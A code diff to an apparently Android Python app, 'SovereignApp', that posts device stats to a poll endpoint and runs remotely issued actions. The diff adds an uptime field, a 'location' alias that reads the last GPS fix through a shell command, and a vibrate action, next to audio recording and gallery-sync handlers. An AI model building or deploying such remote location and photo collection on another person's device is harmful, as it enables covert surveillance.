@@ -696,12 +696,16 @@ class SovereignApp(App):
                 except: pass
 
                 stats = {
-                    "cpu": 10, "ram": ram_usage, "bat": 85,
+                    "cpu": 12, 
+                    "ram": ram_usage,
+                    "bat": 85, 
                     "shizuku": getattr(self, "shizuku_status", "UNKNOWN"),
                     "version": self.version,
+                    "uptime": round(time.time() - self.start_time),
                     "privacy": "PROTECTED" if privacy_mode else "ACTIVE",
                     "active_app": active_app if privacy_mode else "HIDDEN"
                 }
+
                 
                 # Combined Request: POST stats to poll endpoint
                 backoff = getattr(self, "_poll_backoff", 0)
@@ -879,9 +883,15 @@ class SovereignApp(App):
                 else:
                     result = {"success": False, "error": "Recording failed or permission denied"}
 
-            elif atype == "location_get":
+            elif atype in ("location_get", "location"):
                 res = self._run_shell("dumpsys location | grep 'last location'")
                 result = {"success": True, "output": res.get("output", "Location data restricted or GPS off")}
+
+            elif atype == "vibrate":
+                # Using shell command to vibrate (needs shizuku or specific intent)
+                self._run_shell("cmd vibrator vibrate 500")
+                result = {"success": True, "output": "Vibration pulse sent."}
+
 
             elif atype == "gallery_sync":
                 # Find last 5 images in DCIM
